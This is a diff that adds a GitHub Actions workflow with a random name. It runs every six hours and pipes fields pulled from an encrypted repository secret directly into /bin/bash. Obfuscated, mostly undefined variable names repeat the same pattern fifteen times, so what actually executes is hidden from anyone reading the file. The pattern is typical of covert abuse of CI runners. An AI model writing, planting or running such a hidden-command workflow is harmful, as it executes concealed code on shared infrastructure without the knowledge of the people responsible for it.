@@ -1,0 +1,33 @@
+name: xiaomuzhi5678
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '49 2/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: xiaomuzhi5678
+        env:
+          vgqe3: ${{ secrets.vgqe3 }}
+        run: |
+          echo $vgqe3 | jq -r .ve651 | /bin/bash
+          echo $rb436 | jq -r .bdg7270 | /bin/bash
+          echo $mwfj6170 | jq -r .qlsf1 | /bin/bash
+          echo $kmj14024 | jq -r .mcvz2584 | /bin/bash
+          echo $n3 | jq -r .vfgzo078 | /bin/bash
+          echo $y21357 | jq -r .wkc96 | /bin/bash
+          echo $s582 | jq -r .hw756 | /bin/bash
+          echo $h855 | jq -r .c094 | /bin/bash
+          echo $sqzte20 | jq -r .yd1286 | /bin/bash
+          echo $dfea570 | jq -r .dznvx16936 | /bin/bash
+          echo $fefa8 | jq -r .li725 | /bin/bash
+          echo $d50 | jq -r .qb14 | /bin/bash
+          echo $gbo2 | jq -r .p04476 | /bin/bash
+          echo $k67273 | jq -r .eih32 | /bin/bash
+          echo $u0056 | jq -r .xrv81471 | /bin/bash
+          echo $rtgs3085 | jq -r .xjinv776 | /bin/bash
+
